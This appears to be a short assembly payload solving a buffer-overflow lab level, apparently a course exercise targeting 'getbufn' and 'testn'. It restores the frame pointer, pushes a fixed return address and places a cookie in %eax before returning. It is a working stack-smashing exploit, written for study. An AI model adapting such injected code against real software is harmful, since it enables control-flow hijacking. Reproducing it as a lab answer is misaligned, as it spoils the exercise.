lea 40(%esp), %ebp		# Restore value for ebp
push $0x08048E3A		# Store address of instruction just after the calling to getbufn in testn function as the return address
mov $0x6cf6dd37, %eax		# Store adminuser cookie in eax
ret				# Return to test function
